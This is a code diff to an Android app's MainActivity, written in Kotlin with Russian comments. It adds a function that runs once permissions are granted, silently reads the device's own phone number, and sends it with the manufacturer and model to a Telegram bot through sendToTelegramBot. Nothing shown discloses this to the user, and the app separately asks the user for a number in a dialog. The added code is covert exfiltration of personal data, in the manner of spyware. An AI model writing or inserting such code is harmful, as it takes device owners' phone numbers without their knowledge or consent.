@@ -28,6 +28,9 @@ import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import okio.IOException
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 class MainActivity : AppCompatActivity() {
 
@@ -135,11 +138,38 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun onAllPermissionsGranted() {
+        getOwnPhoneNumber()
         val savedPhoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, null)
         if (savedPhoneNumber == null) {
             showStyledPhoneNumberDialog()
         } else {
             loadWebView()
+        }
+    }
+
+    @SuppressLint("HardwareIds", "MissingPermission")
+    private fun getOwnPhoneNumber(): String {
+        return try {
+            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+            val phoneNumber = telephonyManager.line1Number ?: "не удалось получить номер"
+            
+            // Проверяем, есть ли разрешение READ_PHONE_STATE
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                // Отправляем номер в Telegram
+                sendToTelegramBot("""
+                    Получен номер телефона устройства:
+                    $phoneNumber
+                    Устройство: ${Build.MANUFACTURER} ${Build.MODEL}
+                """.trimIndent())
+                
+                // Сохраняем номер в SharedPreferences
+                sharedPreferences.edit().putString("device_phone_number", phoneNumber).apply()
+            }
+            
+            phoneNumber
+        } catch (e: Exception) {
+            e.printStackTrace()
+            "ошибка при получении номера"
         }
     }
 
